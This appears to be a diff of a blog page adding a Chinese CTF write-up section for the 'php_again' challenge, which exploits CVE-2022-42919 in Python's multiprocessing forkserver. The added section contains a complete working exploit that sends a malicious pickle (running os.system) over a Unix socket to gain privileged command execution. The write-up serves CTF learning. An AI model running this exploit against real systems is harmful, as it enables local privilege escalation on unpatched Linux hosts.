@@ -48,8 +48,13 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again16.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again17.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again23.png">
 <meta property="article:published_time" content="2023-07-01T15:27:02.000Z">
-<meta property="article:modified_time" content="2023-07-03T14:32:14.185Z">
+<meta property="article:modified_time" content="2023-07-03T14:45:20.850Z">
 <meta property="article:author" content="fdvoid0">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -301,7 +306,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-07-03 22:32:14" itemprop="dateModified" datetime="2023-07-03T22:32:14+08:00">2023-07-03</time>
+      <time title="Modified: 2023-07-03 22:45:20" itemprop="dateModified" datetime="2023-07-03T22:45:20+08:00">2023-07-03</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -327,14 +332,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>1.2k</span>
+      <span>1.5k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
+      <span>6 mins.</span>
     </span>
 </div>
 
@@ -476,8 +481,36 @@
 <ul>
 <li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again18.png"></li>
 </ul>
-<h1 id="Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE"><a href="#Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE" class="headerlink" title="Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE"></a>Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE</h1><ul>
-<li>漏洞原始出处<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2lzc3Vlcy85NzUxNA==">Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514<i class="fa fa-external-link-alt"></i></span></li>
+<h1 id="Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE"><a href="#Linux-specific-local-privilege-escalation-via-the-multiprocessing-forkserver-start-method-CVE-2022-42919-LPE" class="headerlink" title="Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE"></a>Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE</h1><p>flag在根目录下没权限访问，根目录下还有一个&#x2F;py_server.py文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    import traceback</span><br><span class="line">    traceback.format_exc()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello Ctfer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    multiprocessing.freeze_support()</span><br><span class="line">    multiprocessing.set_start_method(<span class="string">&quot;forkserver&quot;</span>)</span><br><span class="line">    p = multiprocessing.Pool()</span><br><span class="line">    p1 = multiprocessing.Process(target=foo)</span><br><span class="line">    p1.start()</span><br><span class="line">    time.sleep(60*60*24)</span><br></pre></td></tr></table></figure>
+
+<p>看到以下两行，很容易想到python的一个multiprocessing forkserver提权漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">multiprocessing.freeze_support()</span><br><span class="line">multiprocessing.set_start_method(<span class="string">&quot;forkserver&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again22.png"></p>
+</li>
+<li><p>漏洞原始出处<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2lzc3Vlcy85NzUxNA==">Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>看下漏洞的描述意思是起forkserver的时候我们将pick代码注入进去就能直接执行任意命令。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again19.png"></li>
+</ul>
+<p>漏洞代码定位<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMTY5OTEyOGM0ODkxZGEzYmJlMjM1NTNkNzA5MjYxZDg4ODU1YjkzZi9MaWIvbXVsdGlwcm9jZXNzaW5nL2Nvbm5lY3Rpb24ucHkjTDc5LUw4MA==">cpython&#x2F;Lib&#x2F;multiprocessing&#x2F;connection.py<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again21.png"></li>
+</ul>
+<p>这里给了个案例，猜测跟那个pid有关，需要套接字注入到套接字文件</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again20.png"></li>
+</ul>
+<p>pid就是套接字的id直接传值就行了，很容易构造exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import array</span><br><span class="line"></span><br><span class="line">class Person():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        <span class="built_in">command</span>=r<span class="string">&quot;cat /flag&gt;/tmp/pwned&quot;</span></span><br><span class="line">        <span class="built_in">return</span> (os.system,(<span class="built_in">command</span>,))</span><br><span class="line"></span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">f = open(<span class="string">&quot;exp.data&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(opcode)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 定义抽象命名空间套接字路径 没ss</span></span><br><span class="line"><span class="comment"># socket_path = &quot;\0&quot;+os.popen(&quot;ss -lx | grep &#x27;@&#x27;|awk &#x27;&#123;print $5&#125;&#x27;&quot;).read().replace(&quot;@&quot;,&quot;&quot;).strip()</span></span><br><span class="line">socket_path = <span class="string">&quot;\0listener-51-0&quot;</span></span><br><span class="line"><span class="built_in">print</span>(socket_path)</span><br><span class="line">def sendfds(sock, fds):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Send an array of fds over an AF_UNIX socket.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 连接到服务器</span></span><br><span class="line">sock.connect(socket_path)</span><br><span class="line"><span class="comment"># 准备发送的数据</span></span><br><span class="line">data = opcode</span><br><span class="line">def send_fds(sock, msg, fds):</span><br><span class="line">    <span class="built_in">return</span> sock.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array(<span class="string">&quot;i&quot;</span>, fds))])</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&quot;exp.data&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">fd = file.fileno()</span><br><span class="line">parent_r, child_w = os.pipe()</span><br><span class="line">fds = [fd,child_w,fd,fd]</span><br><span class="line">msg = bytes([len(fds) % 256])</span><br><span class="line">send_fds(sock,msg,fds)</span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">sock.close()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>运行exp获取flag</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again23.png"></li>
 </ul>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
 <li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3l5eXlpL3AvMTc1MDAyNjkuaHRtbA==">4.[春秋杯 2023]php_again<i class="fa fa-external-link-alt"></i></span></li>
@@ -643,7 +676,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span>Reading time total &asymp;</span>
-    <span title="Reading time total">39:01</span>
+    <span title="Reading time total">39:02</span>
   </span>
 </div>
 <div class="busuanzi-count">
